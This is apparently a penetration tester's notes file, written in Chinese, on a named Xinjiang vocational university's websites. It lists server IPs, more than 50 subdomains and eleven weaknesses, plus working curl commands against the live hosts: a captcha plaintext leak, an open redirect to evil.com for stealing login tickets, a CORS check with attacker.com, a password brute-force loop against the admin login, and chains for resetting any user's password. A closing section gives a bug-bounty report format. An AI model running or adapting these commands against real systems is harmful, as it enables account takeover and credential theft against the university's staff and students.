# 新疆交通职业技术大学 xjjtedu.com 测试模式 (2026-06-01, 更新2026-06-08)

## 目标概况
- 主域名: xjjtedu.com (124.119.15.220)
- CAS域名: xjjtxy.cn (124.119.15.215)
- BPM域名: xjjtxy.top (事务中心, Vue.js SPA + Java后端)
- CMS: 博达网站群(VSB) + COLLCK反爬cookie
- CAS: 联奕科技(Lianyi) lyuapServer (非蓝盾)
- 后端: Liferay Portal + Tomcat/7.0.109
- 子域名: 50+个(教务/招生/图书馆/科研/视频会议等)

## 发现漏洞汇总 (11个)
| 编号 | 漏洞 | 等级 | 类型 |
|------|------|------|------|
| 1 | 无账号锁定机制(可暴力破解) | 高危 | 设计缺陷 |
| 2 | CAS开放重定向(service参数注入) | 中危 | URL跳转 |
| 3 | CoCall CORS配置不当(任意源站) | 中危 | 配置错误 |
| 4 | CAS验证码明文泄露(getyzm.action) | 中危 | 验证码缺陷 |
| 5 | CAS特定密码触发堆栈泄露(123456等) | 中危 | 信息泄露 |
| 6 | 验证码客户端校验(JS端比对) | 中危 | 设计缺陷 |
| 7 | 密保问题校验逻辑缺陷(所有用户返回true) | 中危 | 逻辑漏洞 |
| 8 | 内网IP泄露(172.16.31.150:20083) | 低危 | 信息泄露 |
| 9 | LT参数泄露(cas01.example.org) | 低危 | 信息泄露 |
| 10 | 子域名资产暴露(50+) | 低危 | 信息泄露 |
| 11 | QR Code登录钓鱼(UUID可获取) | 低危 | 设计缺陷 |

## 关键测试命令

### 1. 验证码明文泄露
```bash
curl -s -c /tmp/cas.txt 'https://www.xjjtxy.cn/ly_web_casconsole/system/login!getyzm.action' | grep -oP '"rand":"\K[^"]+'
```

### 2. CAS开放重定向
```bash
curl -sk 'https://www.xjjtxy.cn/lyuapServer/login?service=https://evil.com/steal-ticket' | grep -oP 'action="[^"]*"'
# 返回: action="/lyuapServer/login;jsessionid=xxx?service=https://evil.com/steal-ticket"
```

### 3. CoCall CORS
```bash
curl -sk 'https://www.xjjtedu.cn:65083/interface/' -H 'Origin: https://attacker.com' -D -
# 返回: access-control-allow-origin: https://attacker.com
```

### 4. 堆栈泄露(特定密码)
```bash
RAND=$(curl -s -c /tmp/cas.txt 'https://www.xjjtxy.cn/ly_web_casconsole/system/login!getyzm.action' | grep -oP '"rand":"\K[^"]+')
curl -sk -b /tmp/cas.txt 'https://www.xjjtxy.cn/ly_web_casconsole/system/login!logincheck.action' -X POST -d "myusername=admin&password=123456&captcha=${RAND}" | grep -oP '<title>[^<]*'
# 返回: 出错了！！
```

### 5. 密保逻辑缺陷
```bash
curl -sk 'https://www.xjjtxy.cn/safe/checkquestionbinding.jsp' -X POST -d 'account=admin'
curl -sk 'https://www.xjjtxy.cn/safe/checkquestionbinding.jsp' -X POST -d 'account=nonexistentuser12345'
# 都返回: true
```

### 6. 自动化爆破脚本
```bash
for PASS in "123456" "admin" "admin123" "password" "xjjt123" "Xjjt@123"; do
  RAND=$(curl -s -c /tmp/cas_${RANDOM}.txt 'https://www.xjjtxy.cn/ly_web_casconsole/system/login!getyzm.action' | grep -oP '"rand":"\K[^"]+')
  RESP=$(curl -sk -b /tmp/cas_${RANDOM}.txt 'https://www.xjjtxy.cn/ly_web_casconsole/system/login!logincheck.action' -X POST -d "myusername=admin&password=${PASS}&captcha=${RAND}" 2>/dev/null)
  if echo "$RESP" | grep -q '"success":true'; then
    echo "[!!!] 成功! 密码: $PASS"
    break
  fi
done
```

## 密码重置流程
1. findPassByother.jsp → 输入账号/姓名/身份证
2. yanzhengma.jsp → 获取验证码(返回明文)
3. checkaccountmassage.jsp → 验证账号信息
4. checkquestionbinding.jsp → 检查密保(返回true)
5. changepwdbyquestion.jsp → 回答密保问题
6. changepwd.jsp → 设置新密码

## 漏洞组合利用
- **高危组合**: 无账号锁定(1) + 验证码明文泄露(4) = 可暴力破解CAS管理后台
- **中危组合**: CAS开放重定向(2) = 可窃取全校师生CAS认证票据
- **中危组合**: 验证码客户端校验(6) + 密保逻辑缺陷(7) = 可重置任意用户密码

## 报告格式
补天标准格式，纯文本，单行curl，===分隔，地址精确到区(新疆维吾尔自治区乌鲁木齐市头屯河区)
